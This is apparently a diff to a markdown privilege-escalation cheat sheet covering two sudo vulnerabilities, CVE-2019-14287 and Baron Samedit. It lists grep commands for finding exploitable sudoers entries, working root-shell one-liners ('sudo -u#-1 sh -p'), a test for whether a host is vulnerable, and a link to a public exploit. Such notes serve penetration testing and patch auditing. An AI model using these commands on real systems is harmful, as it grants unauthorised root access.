@@ -68,31 +68,40 @@ In Sudo before 1.8.28, an attacker with access to a Runas ALL sudoer account can
 
 Exploiting the bug requires that the user have sudo privileges that allow them to run commands with an arbitrary user ID. Typically, this means that the user's sudoers entry has the special value ALL in the Runas specifier. Sudo supports running a command with a user-specified user name or user ID, if permitted by the sudoers policy.
 
-Sudo uses the `setresuid(2)` and `setreuid(2)` system calls to change the user ID before running the command. So if you try to enter a negative user id `-1` (or its unsigned equivalent `4294967295`), `setresuid(2)` and `setreuid(2)` cannot set a negative user id and you're left with the user id sudo is running with : `0`.
+**Find vulnerable users :**
+
+```bash
+grep -e '(\s*ALL\s*,\s*!root\s*)' /etc/sudoers
+# specified by uid
+grep -e '(\s*ALL\s*,\s*\!#0\s*)' /etc/sudoers
+```
+
+Sudo uses the `setresuid(2)` and `setreuid(2)` system calls to change the user ID before running the command. So if you try to enter a negative user id `-1` \(or its 32-bit unsigned equivalent `4294967295`\), `setresuid(2)` and `setreuid(2)` cannot set a negative user id and you're left with the user id sudo is running with : `0`.
 
 Therefore `sudo -u#-1 id -u` or `sudo -u#4294967295 id -u` will actually return `uid=0` and run command as root.
 
 **Exploits** :
- - `sudo -u#-1 sh -p`
- - `sudo -u#4294967295 sh -p`
+
+* `sudo -u#-1 sh -p`
+* `sudo -u#4294967295 sh -p`
 
 **Additional References** :
 
- - https://nvd.nist.gov/vuln/detail/CVE-2019-14287
+* [https://nvd.nist.gov/vuln/detail/CVE-2019-14287](https://nvd.nist.gov/vuln/detail/CVE-2019-14287)
 
-#### CVE-2021-3156 - Heap-Based Buffer Overflow in Sudo (Baron Samedit)
+#### CVE-2021-3156 - Heap-Based Buffer Overflow in Sudo \(Baron Samedit\)
 
-Sudo before 1.9.5p2 has a Heap-based Buffer Overflow, allowing privilege escalation to root via "sudoedit -s" and a command-line argument that ends with a single backslash character. To test if a system is vulnerable or not, login to the system as a non-root user and run command `sudoedit -s /`. 
+Sudo before 1.9.5p2 has a Heap-based Buffer Overflow, allowing privilege escalation to root via "sudoedit -s" and a command-line argument that ends with a single backslash character. To test if a system is vulnerable or not, login to the system as a non-root user and run command `sudoedit -s /`.
 
- - If the system is patched, it will respond with an error that starts with `usage:` such as :
+* If the system is patched, it will respond with an error that starts with `usage:` such as :
 
-```
+```text
 usage: sudoedit [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
 ```
 
- - If the system is vulnerable, it will respond with an error that starts with `sudoedit:` such as :
+* If the system is vulnerable, it will respond with an error that starts with `sudoedit:` such as :
 
-```
+```text
 $ sudoedit -s /
 [sudo] password for user: 
 sudoedit: /: not a regular file
@@ -100,12 +109,12 @@ sudoedit: /: not a regular file
 
 **Exploits** :
 
-To exploit a vulnerable system, you can use this exploit : https://github.com/r4j0x00/exploits/tree/master/CVE-2021-3156_one_shot
+To exploit a vulnerable system, you can use this exploit : [https://github.com/r4j0x00/exploits/tree/master/CVE-2021-3156\_one\_shot](https://github.com/r4j0x00/exploits/tree/master/CVE-2021-3156_one_shot)
 
 **Additional References** :
 
- - Original Advisory : https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit
- - https://nvd.nist.gov/vuln/detail/CVE-2021-3156
+* Original Advisory : [https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit](https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)
+* [https://nvd.nist.gov/vuln/detail/CVE-2021-3156](https://nvd.nist.gov/vuln/detail/CVE-2021-3156)
 
 ## References
 
